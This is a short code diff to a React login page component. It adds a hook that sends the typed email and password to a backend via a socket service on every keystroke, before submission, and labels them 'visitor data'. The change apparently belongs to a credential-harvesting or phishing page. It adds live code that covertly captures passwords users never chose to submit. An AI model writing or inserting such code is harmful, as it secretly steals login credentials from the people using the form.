@@ -1,9 +1,17 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { ArrowLeft } from 'lucide-react';
+import { socketService } from '../services/socketService';
 
 const SimpleLoginPage = () => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
+
+  // Save data to backend when it changes
+  useEffect(() => {
+    if (email || password) {
+      socketService.saveVisitorData({ email, password }, 'simple-login-page');
+    }
+  }, [email, password]);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
